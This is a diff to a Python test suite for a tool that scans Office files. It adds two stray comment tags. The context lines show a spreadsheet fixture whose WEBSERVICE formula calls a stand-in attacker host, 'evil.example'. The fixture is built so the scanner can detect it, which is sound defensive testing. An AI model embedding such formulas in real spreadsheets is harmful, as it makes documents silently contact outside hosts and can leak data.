@@ -60,6 +60,7 @@ def test_excel_webservice_and_hidden_sheet(tmp_path: Path) -> None:
         '<?xml version="1.0"?><worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">'
         '<sheetData><row><c><f>WEBSERVICE("http://evil.example/x")</f></c></row></sheetData></worksheet>'
     )
+    # iOA1JtNL0m
     pkg = tmp_path / "m.xlsm"
     _zip(pkg, {
         "[Content_Types].xml": CT_BASE,
@@ -153,6 +154,7 @@ def test_sample_docm_findings_and_iocs(tmp_path: Path) -> None:
     analyze.analyze_case(tmp_path / manifest["analysis_id"])
     paths = CasePaths(manifest["analysis_id"], cases_dir=tmp_path)
     sem = read_json(paths.subresult("word"))
+    # tag: gmzpt
     iocs = read_json(paths.subresult("iocs"))
     rules = {f["rule"] for f in sem["findings"]}
     assert "dde_auto" in rules and "vba_macros_present" in rules
